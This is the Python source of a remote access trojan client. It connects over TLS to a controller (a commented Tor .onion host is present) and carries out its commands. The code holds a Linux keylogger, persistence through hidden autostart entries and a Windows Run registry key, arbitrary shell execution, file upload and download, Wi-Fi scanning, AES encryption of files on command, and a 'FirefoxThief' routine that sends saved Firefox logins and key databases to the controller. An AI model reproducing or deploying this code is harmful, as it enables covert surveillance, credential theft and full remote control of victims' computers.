import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, simplejson, thread
import inspect, urllib2, os.path, base64, getpass, urllib, netifaces, time
from colored import fg, bg, attr
from subprocess import Popen, PIPE, STDOUT
from wifi import Cell, Scheme
from Crypto.Cipher import AES

if platform.system() == "Windows":
    hookwin = "Can't import pyxhook"
else:
    import pyxhook
    def kbevent(event):
        Wevent = str(event) + "\n"
        log.write(Wevent)

    global HKthread
    global hookman
    global log
    hookman = pyxhook.HookManager()
    HKthread = thread
    HKstat = "OFF"

    def LinuxHOOKER(threadName, running):
        hookman.KeyDown = kbevent
        hookman.HookKeyboard()
        hookman.start()
        while 1:
            time.sleep(0.1)

    def LinuxHOOK(status, namefile):
        global HKstat
        if status == "check":
            return HKstat
        elif status == "ON":
            if status == HKstat:
                report = "Already running"
                return report
            else:
                try:
                    HKthread.start_new_thread(LinuxHOOKER, ("HK-1",1))
                    log = open(namefile, 'wa')
                    HKstat = "ON"
                    return HKstat
                except:
                    HKstat = "Error: unable to start thread"
                    return HKstat
        elif status == "OFF":
            if status == HKstat:
                report = "Already stopped"
                return report
            else:
                try:
                    hookman.cancel() #and so HKthread.exit()
                    time.sleep(0.1)
                    log.close()
                    HKstat = "OFF"
                    return HKstat
                except:
                    statReturn = "Something went wrong, HKstat= " + HKstat
                    return statReturn
        else:
            statReturn = "Something went wrong, HKstat= " + HKstat
            return statReturn

class PKCS7Encoder():
    class InvalidBlockSizeError(Exception):
        """Raised for invalid block sizes"""
        pass

    def __init__(self, block_size=16):
        if block_size < 2 or block_size > 255:
            raise PKCS7Encoder.InvalidBlockSizeError('The block size must be ' \
                    'between 2 and 255, inclusive')
        self.block_size = block_size

    def encode(self, text):
        text_length = len(text)
        amount_to_pad = self.block_size - (text_length % self.block_size)
        if amount_to_pad == 0:
            amount_to_pad = self.block_size
        pad = chr(amount_to_pad)
        return text + pad * amount_to_pad

    def decode(self, text):
        pad = ord(text[-1])
        return text[:-pad]

encoder = PKCS7Encoder()
#host = 'hcjczulezpxxfw2n.onion'
host = '127.0.0.1'
cType = "client000-crypto" #client Type

######### virtus-total check
VTurl = "https://www.virustotal.com/vtapi/v2/file/report"
with open(os.path.basename(__file__) , "rb") as thisFile:
    HF = hashlib.sha256()
    HF.update(thisFile.read())
    thisHash = HF.hexdigest()

# to get your apikey, log in virustotal
#parameters = {"resource": thisHash, "apikey": "YOUR VIRUS-TOTAL API KEY HERE"}
#response = urllib2.urlopen(urllib2.Request(VTurl, urllib.urlencode(parameters)))
#jReport = response.read()

# extract some data
#response_dict = simplejson.loads(jReport)
#rPositives = response_dict.get("positives",{})
rPositives = 0
# check VT stauts
if str(rPositives) != "{}":
    if rPositives == 0:
        VTresponse = "VTcheck: safe | scanned \n" + "|--- sha256: " + thisHash
    elif 0 < rPositives:
        VTresponse = "VTcheck: not-safe | scanned: "+str(rPositives) + "\n|--- sha256: " + thisHash
    else:
        VTresponse = "VTcheck: error occurred"
else:
    VTresponse = "VTcheck: probably safe | not scanned \n|--- sha256: " + thisHash

# sysinfo
uname = platform.uname()[0:3]

# getting target IP
try:
    myIP = urllib2.urlopen("http://myexternalip.com/raw").read()[0:-1]
except:
    myIP = "Error! Can't check IP!"

def RecvData():
    temp = ssl_sock.read()
    return temp

# autostart for Linux
def LinuxAutoStart():
    home = os.environ["HOME"]
    name = "." + inspect.getfile(inspect.currentframe());
    launcher = ["[Desktop Entry]", "Name=", "Type=Application", "NoDisplay=true","X-GNOME-Autostart-enabled=true"]
    dr = home+"/.config/autostart/"
    if not os.path.exists(dr):
        os.makedirs(dr)
    file = dr+name.lower()+".desktop"
    if not os.path.exists(file):
        with open(file, "wt") as out:
            for l in launcher:
                l = l+name if l == "Name=" else l
                out.write(l+"\n")
    #EXEC("chattr +i "+file) you're not r00t
        status = "ok"
    else:
        status = "error"
    return status

# autostart for Windows
def WindowsAutoStart():
    try:
        name = inspect.getfile(inspect.currentframe());
        EXEC("REG ADD \"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" /V \"My App\" /t REG_SZ /F /D "+os.path.dirname(os.path.abspath(__file__))+name)
        EXEC("attrib +h" + name)
        status = "ok"
    except:
        status = "error"
    return status

def ScanWIFI(card):
    try:
        wifiCell = Cell.all(card)
    except:
        wifiCell = Cell.all('wlan0')
        SendData("Something went wrong... using wlan0")
    for i in range(0,len(wifiCell)):
        SendData(str(wifiCell[i]) + " is encrypted: "+ str(wifiCell[i].encrypted) + "= " + str(wifiCell[i].encryption_type) + " | address: " +str(wifiCell[i].address))
    SendData("ScanWIFI-finished")

def RecvData():
    temp = ssl_sock.read()
    return temp

def FirefoxThief():
    if platform.system() == "Linux":
        SendData("Ok: Linux supported")
        if os.path.isdir("/home/"+getpass.getuser()+"/.mozilla/firefox/") == True:
            os.chdir("/home/"+getpass.getuser()+"/.mozilla/firefox/")
            SendData(EXEC("ls -la"))
            newDir = RecvData()
            UploadFILE("profiles.ini")
            os.chdir("/home/"+getpass.getuser()+"/.mozilla/firefox/"+newDir)
            UploadFILE("cert8.db")
            UploadFILE("key3.db")
            UploadFILE("logins.json")
        else:
            SendData("Error: Firefox directory not found!")
    else:
        SendData("Error: not Linux, not supported!")


def DKey(primitiveKey, salt):
    dk = hashlib.pbkdf2_hmac('sha256', primitiveKey, salt, 500000)
    return dk

def Encrypt(fileToProtect, cipher, key, IV):
    try:
        with open(fileToProtect, 'rb') as inFile, open(fileToProtect + '.enc', 'wa') as outFile:
            clearData = inFile.read()
            cryptData = cipher.encrypt(encoder.encode(clearData))
            outFile.write(cryptData)
        inFile.close()
        outFile.close()
        SendData('############################ Encrption Success')
        SendData('--> original file: ' + str(fileToProtect))
        SendData('--> protected file: ' + str(fileToProtect) + '.enc')
        SendData('HEX: ' + str(CheckHash(fileToProtect + '.enc', key, IV)))
        SendData('HashKEY: ' + base64.b64encode(DKey(key, IV)))
        SendData('----------------------------------------------')
        SendData('END')
    except:
        SendData('############################ Encrption Failed')
        if os.path.isfile(fileToProtect + '.enc') == True:
            os.remove(fileToProtect + '.enc')
            SendData('Files deleted!')
            SendData('END')
        else:
            SendData('--> no file encrypted')
            SendData('----------------------------------------------')
            SendData('END')

def Decrypt(fileProtected, cipher, digest, key, IV):
    fileToDeProtect = fileProtected.split('.')[0] + "." + fileProtected.split('.')[1] + ".dec"
    try:
        if hmac.compare_digest(CheckHash(fileProtected, key, IV), digest) == True:
            with open(fileProtected, 'rb') as inFile, open(fileToDeProtect, 'wa') as outFile:
                cryptData = inFile.read()
                clearData = cipher.decrypt(cryptData)
                cleanData = encoder.decode(clearData)
                outFile.write(cleanData)
            inFile.close()
            outFile.close()
        else:
            raise ValueError ('Data Not Secure')
        SendData('############################ Decrption Success')
        SendData('--> original file: ' + fileProtected)
        SendData('--> protected file: ' + fileToDeProtect)
        SendData('HashKEY: ' + base64.b64encode(DKey(key, IV)))
        SendData('HASH: Verified')
        SendData('----------------------------------------------')
        SendData('END')
    except:
        SendData('############################ Decrption Failed')
        SendData('Removing files!')
        if os.path.isfile(fileProtected ) == True:
            os.remove(fileProtected)
            SendData('File protected deleted')
        if os.path.isfile(fileToDeProtect) == True:
            os.remove(fileToDeProtect)
            SendData('File to de-protect deleted')
        else:
            SendData('--> no file here')
            SendData('----------------------------------------------')
            SendData('END')

def CheckHash(fileName, key, IV):
    hasher = hmac.new(DKey(key, IV),'',hashlib.sha256)
    with open(fileName, 'rb') as inFile:
        buf = inFile.read(2048)
        hasher.update(buf)
    return base64.b64encode(hasher.digest())

def SendData(inText):
    ssl_sock.write(inText)

def EXEC(cmd):
    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
    return p.stdout.read()

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    SendData(str(os.path.getsize(fileName)))
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            SendData(tempData)
    fileUP.close()
    SendData("CUF") #Client Upload Finished

def DownloadFILE(fileName):
    fileDOWN = open(fileName, 'wa')
    while 1:
        temp = RecvData()
        if temp == 'SUF':
            break
        else:
            fileDOWN.write(temp)
    fileDOWN.close()
    SendData("CDF")

certificate = """-----BEGIN CERTIFICATE-----\n
MIICaDCCAdGgAwIBAgIJAJmzO+Nz8Q9SMA0GCSqGSIb3DQEBCwUAME0xCzAJBgNV
BAYTAkRXMQ8wDQYDVQQIDAZUb3JOZXQxDDAKBgNVBAoMA1QyQjEfMB0GA1UEAwwW
aGNqY3p1bGV6cHh4Zncybi5vbmlvbjAeFw0xNjA1MTYxNzI5NThaFw0yNjA1MTQx
NzI5NThaME0xCzAJBgNVBAYTAkRXMQ8wDQYDVQQIDAZUb3JOZXQxDDAKBgNVBAoM
A1QyQjEfMB0GA1UEAwwWaGNqY3p1bGV6cHh4Zncybi5vbmlvbjCBnzANBgkqhkiG
9w0BAQEFAAOBjQAwgYkCgYEA0DzzRuOWrxCGNG7vF9VxghbS5vHpSBNs5o2Mtar7
iVZFdqO1Yc3YHQ8XqIWytlqYo/ViKEgo0o+GtZxSBXpnpfruYtS9df3xzxBXkKo4
8S6ruPC9/aI8QdUslytKcvHRfQqAKLFiuuukgPXHUNNqizaSsebRWQpZmkWg0D6o
5nMCAwEAAaNQME4wHQYDVR0OBBYEFMwvDGhcC3+uNxD31WsdwPF4t5bnMB8GA1Ud
IwQYMBaAFMwvDGhcC3+uNxD31WsdwPF4t5bnMAwGA1UdEwQFMAMBAf8wDQYJKoZI
hvcNAQELBQADgYEAYJLaW4lXmmKH0yyFnCqbTaaJrTTuDnnH60eKyhk95VG7Jmx4
6rKKlT/6QlZ3/CKhQI4agg67sjWEIj77bF1c4mlZDfgSRPxeOqf/EKFx/ACgAg/7
SpzSIqUA7b1hFHax969cOEq/39p9Y9XEdYhO7FhWmR4XioaduKmlQRNa6y8=
-----END CERTIFICATE-----"""

CH = hashlib.sha256()
CH.update(certificate)
certificateHASH = CH.digest()

if os.path.isfile("certificate.pem")==True:
    with open("certificate.pem" , "rb") as inCert:
        Cin = hashlib.sha256()
        Cin.update(inCert.read())
        CinH = Cin.digest()
    if hmac.compare_digest(certificateHASH, CinH):
        print("Cert ok")
else:
    with open("certificate.pem", "wa") as out:
        out.write(certificate)
        out.close()
        print("Cert generated")

sock = socks.socksocket()
#sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
sock.connect((host,5555))

ssl_sock = ssl.wrap_socket(sock, ca_certs="certificate.pem", cert_reqs=ssl.CERT_REQUIRED)

print repr(ssl_sock.getpeername())
print ssl_sock.cipher()
infosServer = ssl_sock.getpeercert()
#ssl.match_hostname(infosServer,host)
SendData(cType)

while 1:
    inText = RecvData()
    if inText.startswith("download"):
        UploadFILE(inText.split(" ")[1])
    elif inText == "info":
        SendData(str(uname))
        SendData('ip:'+myIP)
        SendData(VTresponse)
        SendData("end-info")
    elif inText.startswith("set"):
        if inText.split(":")[1]== "autostart":
            if platform.system() == "Linux":
                SendData("LinuxAutoStart: " +LinuxAutoStart())
                pass
            elif platform.system() == "Windows":
                SendData("WindowsAutoStart: "+WindowsAutoStart())
            else: # at the moment os x not supported
                SendData("No Windows/Linux system")
        else:
            SendData("usage: set:autostart")
            pass
    elif inText.startswith("upload"):
        DownloadFILE(inText.split(" ")[1])
    elif inText == "terminate":
        ssl_sock.close()
        sys.exit(0)
    elif inText.startswith("hook"):
        if platform.system() == "Linux":
            hookstat = LinuxHOOK(inText.split(':')[1],inText.split(":")[2])
            SendData(hookstat)
        else:
            SendData("Error: platform not supported!")
    elif inText == "get-inferfaces":
        SendData(str(netifaces.interfaces()))
    elif inText.startswith("ScanWIFI"):
        ScanWIFI(inText.split(':')[1])
    elif inText.startswith('protect'):
        if inText.split(':')[1] == 'enc':
            fileToProtect = inText.split(':')[2]
            IV = os.urandom(16)
            key = os.urandom(32)
            SendData('IV: ' + base64.b64encode(IV))
            SendData('key: '+ base64.b64encode(key))
            cipher = AES.new(key, AES.MODE_CBC, IV)
            Encrypt(fileToProtect, cipher, key, IV)
        elif inText.split(':')[1] == 'dec':
            fileToDeProtect = inText.split(':')[2]
            IV = base64.b64decode(inText.split(':')[3])
            key = base64.b64decode(inText.split(':')[4])
            HEX = inText.split(':')[5]
            cipher = AES.new(key, AES.MODE_CBC, IV)
            Decrypt(fileToDeProtect, cipher, HEX, key, IV)
    elif inText.startswith("exec"):
        outEXEC = EXEC(inText.split(":")[1])
        SendData(outEXEC)
    elif inText == "FirefoxThief":
        FirefoxThief()
    else:
        print '[inText] ' + inText
        ssl_sock.write(inText)
